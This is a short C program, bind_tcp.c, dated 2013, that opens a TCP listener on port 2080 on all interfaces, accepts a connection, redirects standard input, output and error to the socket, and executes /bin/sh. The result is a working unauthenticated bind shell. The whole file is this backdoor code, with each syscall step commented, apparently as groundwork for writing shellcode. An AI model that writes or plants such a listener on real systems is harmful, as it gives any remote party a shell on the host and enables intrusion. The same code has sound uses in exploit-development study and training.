/*
 Filename  : bind_tcp.c
 Author    : M.Acosta snow <amcx62[_at_]gmail[_dot_]com>
 Date      : 2013 August
 Location  : Lima(Peru)
 Desc	   : Bind Tcp C program 
 Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
*/

#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>

int main(){
	
	int sfd,cfd;
	int port;
	struct sockaddr_in local_addr;
	struct sockaddr_in client_addr;

	port=2080;

	/* 1) socket syscall */
	sfd=socket(AF_INET,SOCK_STREAM,0);

	local_addr.sin_family=AF_INET;           
        local_addr.sin_addr.s_addr=htonl(INADDR_ANY);    
        local_addr.sin_port=htons(port);          

	/* 2) bind syscall*/
	bind(sfd,(struct sockaddr *)&local_addr, sizeof(local_addr));

	/* 3) listen syscall */
	listen(sfd,1);
	
	/* 4) accept syscall */
	cfd=accept(sfd,NULL,NULL);
	
	/* 5) dup2 syscall */
	dup2(cfd,0);
	dup2(cfd,1);
	dup2(cfd,2);
	
	/* 6) exeve syscall */	
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
